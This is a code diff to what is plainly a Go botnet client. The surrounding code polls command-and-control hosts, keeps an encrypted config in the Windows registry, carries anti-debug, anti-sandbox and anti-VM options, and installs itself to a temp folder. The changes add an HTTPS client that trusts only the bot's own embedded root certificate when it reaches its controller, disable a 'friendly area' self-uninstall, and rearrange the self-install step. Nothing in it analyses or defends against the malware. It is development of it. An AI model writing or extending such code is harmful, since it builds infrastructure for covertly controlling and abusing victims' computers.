@@ -1,9 +1,12 @@
 package components
 
 import (
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/json"
 	"io"
 	"log"
+	"net/http"
 	"os"
 	"strconv"
 	"strings"
@@ -185,7 +188,6 @@ func handle_command() {
 		time.Sleep(time.Second * time.Duration(random_int(1, 5)))
 		stat = auth_bot_poll(stat, botcore.hosts[0])
 	}
-
 }
 
 func read_config() bool {
@@ -194,7 +196,7 @@ func read_config() bool {
 	// Try to read config from registry
 	bytesConfig, ok := reg_read_key(registry.CURRENT_USER, g_regpath, "config", 2).([]byte)
 	if ok && bytesConfig != nil {
-		// Read configure from registry ok\
+		// Read configure from registry ok
 		len := len(bytesConfig) - 32
 		encConfig := bytesConfig[:len]
 		key := bytesConfig[len:]
@@ -265,10 +267,14 @@ func read_config() bool {
 	botcore.use_ssl = build_config.Use_ssl
 	botcore.version = build_config.Version
 	botcore.hosts = build_config.Host
+	botcore.root_pem = build_config.RootPem
 	//fmt.Println("singleton: ", botcore.singleton, "antidebug: ", botcore.anti_debug, "antisandbox: ", botcore.anti_sandbox, "antivm: ", botcore.anti_vm,
 	//	"mutex: ", botcore.mutex_name, "delay: ", botcore.delay, "use_ssl: ", botcore.use_ssl, "version: ", botcore.version, "host: ", botcore.hosts)
 	//if botcore.install {
 	//	fmt.Println("install file: ", botcore.install_file)
+	//}
+	//if botcore.use_ssl {
+	//	fmt.Println("ssl: ", botcore.root_pem)
 	//}
 	//bufio.NewReader(os.Stdin).ReadString('\n')
 
@@ -276,18 +282,33 @@ func read_config() bool {
 }
 
 func Run() {
-	uinstall()
-	
-	if run_on_friendly_area() {
-		uinstall()
-	}
+	// Uninstall if machine in friendly areas
+	//if run_on_friendly_area() {
+	//	uinstall()
+	//}
 	// Read configure
 	if !read_config() {
 		os.Exit(0)
 	}
-	// Install self to temp folder
-	if botcore.install {
-		install_payload()
+
+	// HTTPS setup
+	if botcore.use_ssl {
+		// Create CA pool
+		caPool := x509.NewCertPool()
+		bytPem, _ := base64_dec(botcore.root_pem)
+		caPool.AppendCertsFromPEM(bytPem)
+
+		// TLS config, only trust this CA
+		clientHTTPS = &http.Client{
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{
+					RootCAs:    caPool,
+					ServerName: strings.Split(botcore.hosts[0], ":")[0],
+				},
+				// &tls.Config{ InsecureSkipVerify: true, },
+			},
+			Timeout: 20 * time.Second,
+		}
 	}
 
 	// Check singleton
@@ -317,7 +338,7 @@ func Run() {
 		return
 	}
 
-	// Install self
+	// Install self to temp folder
 	if botcore.install {
 		install_payload()
 	}
